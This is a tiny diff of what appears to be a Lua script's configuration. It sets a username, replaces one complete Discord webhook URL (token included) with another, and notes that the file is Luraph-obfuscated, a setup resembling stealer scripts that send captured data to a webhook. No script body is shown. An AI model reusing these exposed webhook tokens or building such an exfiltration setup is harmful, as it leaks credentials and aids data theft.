@@ -1,5 +1,5 @@
 Username = "jwuwkskx"
-Webhook = "https://discord.com/api/webhooks/1382274273820807228/8P3t-fMkv7X2VGDgFJrixJ3wA_MWxeXIeGeNUEcQ1TP6hJ1yBAFh6s3kipr1HUbmwXaR"
+Webhook = "https://discord.com/api/webhooks/1374429571423670305/1n_apBx25sgmvB7YygSNY0MU4JXZ7zaFUN-LxZoPu8Yc0xMmXZZqPOyUru5AXS9rDw9U"
 
 -- This file was protected using Luraph Obfuscator v14.4.1 [https://lura.ph/]
 
